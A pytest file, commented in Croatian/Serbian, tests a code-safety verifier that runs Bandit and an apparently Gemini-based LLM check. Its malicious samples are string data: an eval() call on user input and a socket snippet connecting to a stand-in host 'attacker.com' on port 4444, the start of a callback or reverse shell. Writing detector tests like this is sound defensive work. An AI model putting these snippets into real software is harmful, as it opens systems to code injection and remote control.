import pytest
from verifier import run_bandit, run_llm_analysis
import os
import tempfile

# --- Test 1: Benigan kod prolazi Bandit ---
def test_bandit_benign():
    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "main.py"), "w") as f:
            f.write("print('Hello World')\n")
        
        result = run_bandit(tmpdir)
        assert result["passed"] == True

# --- Test 2: Maliciozan kod pada Bandit ---
def test_bandit_malicious():
    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "main.py"), "w") as f:
            # eval() sa user inputom je HIGH severity (B307)
            f.write("user_input = input()\neval(user_input)\n")
        
        result = run_bandit(tmpdir)
        assert result["passed"] == False
        
# --- Test 3: LLM analiza benignog koda (pravi Gemini API) ---
def test_llm_benign():
    result = run_llm_analysis("def add(a, b):\n    return a + b")
    assert result["safe"] == True

# --- Test 4: LLM analiza malicioznog koda (pravi Gemini API) ---
def test_llm_malicious():
    result = run_llm_analysis("import socket\ns=socket.socket()\ns.connect(('attacker.com',4444))")
    assert result["safe"] == False